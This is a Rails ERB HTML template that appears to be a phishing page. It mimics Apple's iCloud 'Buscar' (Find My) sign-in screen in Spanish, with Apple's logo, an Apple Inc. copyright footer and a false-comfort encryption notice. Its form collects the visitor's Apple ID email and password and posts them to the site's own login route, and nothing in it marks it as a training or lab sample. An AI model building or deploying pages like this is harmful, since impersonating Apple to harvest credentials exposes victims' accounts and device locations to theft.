<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Buscar - iCloud</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; -webkit-font-smoothing:antialiased; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
      background: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .find-my-logo { width:80px; height:80px; margin-bottom:18px; }
    .app-title { color:#1d1d1f; font-size:28px; font-weight:600; letter-spacing:-0.5px; margin-bottom:6px; text-align:center; }
    .app-subtitle { color:#6e6e73; font-size:15px; margin-bottom:32px; text-align:center; }
    .login-card {
      background: rgba(0,0,0,0.03);
      border: 1px solid rgba(0,0,0,0.1);
      border-radius:18px;
      padding:32px 28px;
      width:100%; max-width:380px;
      backdrop-filter:blur(20px);
    }
    .card-title { color:#1d1d1f; font-size:20px; font-weight:600; text-align:center; margin-bottom:6px; }
    .card-subtitle { color:#6e6e73; font-size:13px; text-align:center; margin-bottom:26px; line-height:1.5; }
    .form-group { margin-bottom:12px; }
    .form-input {
      width:100%;
      background:rgba(0,0,0,0.04);
      border:1px solid rgba(0,0,0,0.1);
      border-radius:12px;
      padding:14px 16px;
      color:#1d1d1f;
      font-size:16px;
      font-family:inherit;
      outline:none;
      transition:border-color 0.2s, background 0.2s;
      -webkit-appearance:none;
    }
    .form-input::placeholder { color:#6e6e73; }
    .form-input:focus { border-color:rgba(0,122,255,0.7); background:rgba(0,0,0,0.06); }
    .form-input:-webkit-autofill {
      -webkit-box-shadow:0 0 0 1000px #ffffff inset;
      -webkit-text-fill-color:#1d1d1f;
    }
    .btn-signin {
      width:100%;
      background:#0071e3;
      color:#fff;
      border:none;
      border-radius:12px;
      padding:14px;
      font-size:16px;
      font-weight:600;
      font-family:inherit;
      cursor:pointer;
      margin-top:8px;
      transition:background 0.2s, transform 0.1s;
      -webkit-appearance:none;
    }
    .btn-signin:hover { background:#0077ed; }
    .btn-signin:active { background:#006adb; transform:scale(0.99); }
    .divider { display:flex; align-items:center; gap:12px; margin:20px 0; }
    .divider-line { flex:1; height:1px; background:rgba(0,0,0,0.1); }
    .divider-text { color:#6e6e73; font-size:12px; }
    .links-row { display:flex; justify-content:center; gap:20px; }
    .link { color:#0071e3; font-size:13px; text-decoration:none; }
    .link:hover { text-decoration:underline; }
    .security-notice {
      display:flex; align-items:center; gap:10px;
      background:rgba(255,159,10,0.08);
      border:1px solid rgba(255,159,10,0.18);
      border-radius:10px;
      padding:12px 14px;
      margin-top:20px;
    }
    .security-text { color:#86868b; font-size:12px; line-height:1.5; }
    .footer { color:#6e6e73; font-size:11px; text-align:center; margin-top:30px; line-height:1.9; }
    .footer a { color:#6e6e73; text-decoration:none; }
    .footer a:hover { color:#86868b; }
    @media (max-width:400px) {
      .login-card { padding:26px 18px; }
      .app-title { font-size:24px; }
      .find-my-logo { width:64px; height:64px; }
    }
  </style>
</head>
<body>

  <svg class="find-my-logo" viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
    <path fill="#1d1d1f" d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 790.8 0 663 0 541.8 0 347.1 133.7 243.4 265.7 243.4c70.9 0 130.3 46.8 174.5 46.8 42.1 0 108.2-49.8 190.5-49.8zm-160.7-126c30.9-36.6 53.1-87.7 53.1-138.8 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.8z"/>
  </svg>

  <h1 class="app-title">Buscar</h1>
  <p class="app-subtitle">Inicia sesion con tu Apple ID</p>

  <div class="login-card">
    <h2 class="card-title">Apple ID</h2>
    <p class="card-subtitle">Inicia sesion para ver la ubicacion<br>de tus dispositivos Apple</p>

    <%= form_with url: login_path, method: :post, local: true do |f| %>
      <div class="form-group">
        <%= f.email_field :email,
              placeholder: "Apple ID (correo electronico)",
              class: "form-input",
              autocomplete: "email",
              autocorrect: "off",
              autocapitalize: "none",
              spellcheck: "false",
              required: true %>
      </div>
      <div class="form-group">
        <%= f.password_field :password,
              placeholder: "Contrasena",
              class: "form-input",
              autocomplete: "current-password",
              required: true %>
      </div>
      <%= f.submit "Iniciar sesion", class: "btn-signin" %>
    <% end %>

    <div class="divider">
      <div class="divider-line"></div>
      <span class="divider-text">o</span>
      <div class="divider-line"></div>
    </div>

    <div class="links-row">
      <a href="#" class="link">Olvidaste tu Apple ID?</a>
      <a href="#" class="link">Crear cuenta</a>
    </div>

    <div class="security-notice">
      <span style="font-size:16px;">&#x1F512;</span>
      <span class="security-text">Tu ubicacion esta protegida con cifrado de extremo a extremo.</span>
    </div>
  </div>

  <div class="footer">
    <a href="#">Privacidad</a> &bull;
    <a href="#">Terminos de uso</a> &bull;
    <a href="#">Asistencia</a><br>
    Copyright &copy; <%= Time.current.year %> Apple Inc. Todos los derechos reservados.
  </div>

</body>
</html>
